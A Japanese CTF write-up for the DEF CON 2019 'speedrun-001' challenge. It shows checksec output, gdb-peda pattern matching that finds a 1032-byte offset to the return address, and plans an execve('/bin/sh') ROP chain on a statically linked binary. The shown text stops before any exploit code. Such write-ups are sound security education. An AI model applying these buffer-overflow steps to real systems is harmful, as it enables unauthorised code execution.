## 問題はこちら
https://scoreboard2019.oooverflow.io/#/


## speeedrun-001

```
$ checksec speedrun-001
[*] '/home/vagrant/ctf/DEFCON2019/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
```
No canary, No PIEだからBOFが使えそうです.
また`statically linked`と出ましたね. ROP gadgetsが使えそうです.

という事でまずは入力部までのオフセットをBOFを利用して数えます.
```
$ gdb -q speedrun-001
Reading symbols from speedrun-001.dms...(no debugging symbols found)...done.
gdb-peda$ pattern_create 2000 random
Writing pattern of 2000 chars to filename "random"
gdb-peda$ r < random
Starting program: /home/vagrant/ctf/DEFCON2019/speedrun-001 < random
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA
(...)
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xddf
RBX: 0x400400 (sub    rsp,0x8)
RCX: 0x0
RDX: 0x6bbd30 --> 0x0
RSI: 0x0
RDI: 0x1
RBP: 0x6e41286e412d6e41 ('An-An(An')
RSP: 0x7fffffffe138 ("DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(A"...)
RIP: 0x400bad (ret)
R8 : 0xddf
R9 : 0xddf
R10: 0x7fffffffc47e --> 0xa ('\n')
R11: 0x246
R12: 0x4019a0 (push   rbp)
R13: 0x0
R14: 0x6b9018 --> 0x440ea0 (mov    rcx,rsi)
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ba6:	call   0x40f710
   0x400bab:	nop
   0x400bac:	leave
=> 0x400bad:	ret
   0x400bae:	push   rbp
   0x400baf:	mov    rbp,rsp
   0x400bb2:	lea    rdi,[rip+0x919cd]        # 0x492586
   0x400bb9:	call   0x410390
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe138 ("DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(A"...)
0008| 0x7fffffffe140 ("nEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)"...)
0016| 0x7fffffffe148 ("AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC"...)
0024| 0x7fffffffe150 ("1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbA"...)
0032| 0x7fffffffe158 ("n2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACc"...)
0040| 0x7fffffffe160 ("An3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHAC"...)
0048| 0x7fffffffe168 ("eAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIA"...)
0056| 0x7fffffffe170 ("nfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJ"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400bad in ?? ()
gdb-peda$ patto DAn;An)
DAn;An) found at offset: 1032
```

という事で, リターンアドレスから入力部までのオフセットは`1032`bytesだと分かりました.


次に`statically linked`を利用します.

次のリンク先を参考にして, `execve('bin/sh')`を実行させることを目標とします.
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

最終的には. 以下のように各レジスタに必要な情報(ない場合は`null`)を入れていきます.

| %rax | System call | %rdi | %rsi | %rdx |
|---|---|---|---|---|
| 59 | sys_execve | const char *filename | const char *const argv[] | const char *const envp[] |

